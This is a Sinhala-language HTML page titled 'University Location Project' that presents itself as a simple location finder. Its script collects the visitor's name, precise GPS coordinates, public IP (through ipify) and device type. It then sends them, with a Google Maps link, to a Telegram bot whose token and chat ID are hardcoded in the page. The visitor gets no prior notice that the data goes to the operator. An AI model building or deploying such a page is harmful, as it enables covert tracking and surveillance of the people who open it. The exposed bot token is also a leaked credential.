<!DOCTYPE html>
<html lang="si">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>University Location Project</title>

    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #eef2f3;
            margin: 0;
        }

        .container {
            background: #ffffff;
            padding: 30px;
            border-radius: 12px;
            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.15);
            text-align: center;
            width: 320px;
        }

        h2 {
            margin-top: 0;
            color: #333;
        }

        .location-box {
            background-color: #e3f2fd;
            color: #0d47a1;
            padding: 15px;
            border-radius: 8px;
            margin-bottom: 20px;
            font-weight: bold;
            font-size: 14px;
            line-height: 1.5;
            word-wrap: break-word;
            min-height: 100px;
        }

        input[type="text"] {
            width: 90%;
            padding: 12px;
            margin-bottom: 15px;
            border: 1px solid #ccc;
            border-radius: 6px;
            outline: none;
            font-size: 14px;
        }

        input[type="text"]:focus {
            border-color: #007bff;
        }

        button {
            width: 100%;
            padding: 12px;
            background-color: #007bff;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            transition: background 0.3s ease;
        }

        button:hover {
            background-color: #0056b3;
        }

        #status {
            margin-top: 12px;
            font-size: 12px;
            color: #666;
            display: none;
        }

        #status.success {
            color: #28a745;
            display: block;
        }

        #status.error {
            color: #dc3545;
            display: block;
        }
    </style>
</head>
<body>

    <div class="container">
        <h2>📍 Location Finder</h2>
        
        <div id="location-display" class="location-box">
            ඔබේ Location එක මෙතැන පෙන්වනු ඇත.
        </div>

        <form id="userForm">
            <input type="text" id="username" placeholder="ඔබේ නම ඇතුළත් කරන්න" required>
            <button type="submit">Submit</button>
        </form>

        <div id="status"></div>
    </div>

    <script>
        // =============================================
        // 🔐 TELEGRAM CONFIG - ඔයාගේ Token එක දාන්න
        // =============================================
        const BOT_TOKEN = '8864995146:AAERB2czzLwxRORXAHcFieptoqXdCJ7BLec';
        const CHAT_ID = '8308044531';

        // =============================================
        // 📝 FORM SUBMIT
        // =============================================
        document.getElementById('userForm').addEventListener('submit', function(e) {
            e.preventDefault();

            const name = document.getElementById('username').value.trim();
            const displayBox = document.getElementById('location-display');
            const statusDiv = document.getElementById('status');

            statusDiv.style.display = 'none';

            if (!name) {
                displayBox.innerText = "⚠️ කරුණාකර ඔබේ නම ඇතුළත් කරන්න.";
                return;
            }

            displayBox.innerText = "⏳ Location ලබාගනිමින් පවතී...";

            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    // ✅ Success
                    function(position) {
                        const lat = position.coords.latitude;
                        const lon = position.coords.longitude;
                        const accuracy = position.coords.accuracy;

                        // Display
                        displayBox.innerText = `✅ ආයුබෝවන් ${name}!\n\n📍 Latitude: ${lat}\n📍 Longitude: ${lon}\n📏 Accuracy: ${accuracy}m`;

                        // Send to Telegram
                        sendToTelegram(name, lat, lon);
                    },
                    // ❌ Error
                    function(error) {
                        let msg = "❌ Location permission ලබාදීම ප්‍රතික්ෂේප විය.";
                        if (error.code === 1) {
                            msg = "❌ Permission denied. කරුණාකර Location Allow කරන්න.";
                        } else if (error.code === 2) {
                            msg = "❌ Location unavailable. GPS check කරන්න.";
                        } else if (error.code === 3) {
                            msg = "⏳ Location timeout. නැවත උත්සාහ කරන්න.";
                        }
                        displayBox.innerText = msg;
                        showStatus(msg, 'error');
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 10000,
                        maximumAge: 0
                    }
                );
            } else {
                displayBox.innerText = "❌ ඔබගේ Browser එක Location Support නොකරයි.";
            }
        });

        // =============================================
        // 📤 SEND TO TELEGRAM
        // =============================================
        async function sendToTelegram(name, lat, lon) {
            try {
                const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;

                // Get device info
                const ua = navigator.userAgent;
                const device = ua.match(/Android|iPhone|iPad|Windows|Mac|Linux/i)?.[0] || 'Unknown';

                // Get IP
                let ip = 'Unknown';
                try {
                    const res = await fetch('https://api.ipify.org?format=json');
                    const data = await res.json();
                    ip = data.ip || 'Unknown';
                } catch (e) {}

                const msg = `
📍 **LOCATION SUBMITTED**

👤 Name: ${name}
📱 Device: ${device}
🌐 IP: ${ip}
🕐 Time: ${new Date().toLocaleString()}

📍 Coordinates:
Latitude: ${lat}
Longitude: ${lon}

🗺️ Google Maps:
${mapsLink}
                `;

                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: msg,
                        parse_mode: 'Markdown'
                    })
                });

                if (response.ok) {
                    showStatus('✅ Location sent to Telegram!', 'success');
                } else {
                    showStatus('⚠️ Location saved locally, Telegram send failed.', 'error');
                }

            } catch (err) {
                console.error('Telegram error:', err);
                showStatus('⚠️ Location saved locally, but Telegram send failed.', 'error');
            }
        }

        // =============================================
        // 📌 SHOW STATUS
        // =============================================
        function showStatus(msg, type) {
            const statusDiv = document.getElementById('status');
            statusDiv.style.display = 'block';
            statusDiv.className = type;
            statusDiv.textContent = msg;
        }

        console.log('✅ Location Finder Loaded');
    </script>

</body>
</html>
